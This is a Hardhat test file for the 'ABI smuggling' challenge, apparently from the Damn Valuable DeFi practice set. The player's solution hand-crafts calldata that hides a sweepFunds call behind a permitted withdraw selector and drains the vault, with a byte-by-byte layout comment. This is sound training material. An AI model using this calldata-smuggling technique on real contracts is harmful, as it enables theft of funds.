const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();
 
        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address); // withdraw
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // Connect to challenge contracts
        const attackVault = await vault.connect(player);
        const attackToken = await token.connect(player);
        console.log(vault.address);
        
        // Create components of calldata
        const executeFs = vault.interface.getSighash("execute")
        console.log(executeFs);
        const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
        console.log(target);
        // Modified offset to be 4 * 32 bytes from after the function selector
        const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); 
        console.log(bytesLocation);
        const withdrawSelector =  vault.interface.getSighash("withdraw").slice(2);
        console.log(withdrawSelector);
        // Length of actionData calldata FS(1 * 4) + Parameters(2 * 32) Bytes
        const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)
        console.log(bytesLength);
        // actionData actual data: FS + address + address
        const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);
        console.log(sweepSelector);
        const sweepFundsData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
                      + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
        console.log(sweepFundsData);
        const payload = executeFs + 
                        target + 
                        bytesLocation + 
                        ethers.utils.hexZeroPad("0x0", 32).slice(2) +
                        withdrawSelector + 
                        ethers.utils.hexZeroPad("0x0", 28).slice(2) +
                        bytesLength + 
                        sweepSelector + 
                        sweepFundsData;

//0x1cff79cd                                                              => execute function slecor
//000000000000000000000000e7f1725E7734CE288F8367e1Bb143E90bb3F0512(0x00)  => selfAuthorizedVault address
//0000000000000000000000000000000000000000000000000000000000000080(0x20)  => bytes location = 0x80(128)
// telling where to find the data location to execute
//0000000000000000000000000000000000000000000000000000000000000000(0x40)  => zero padded
//d9caed1200000000000000000000000000000000000000000000000000000000(0x60)  => withdraw function selector
// to verify for the player permission we use withdraw selector at (4 + 32 * 3) bytes location
//0000000000000000000000000000000000000000000000000000000000000044(0x80)  => bytes length to start execution
//85fb709d                                                                => sweepfunds function selector
//0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC        => recevory address
//0000000000000000000000005FbDB2315678afecb367f032d93F642f64180aa3        => DVD token address

       console.log(payload);

        await player.sendTransaction(
            {
                to:attackVault.address,
                data: payload,
            }
        )
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
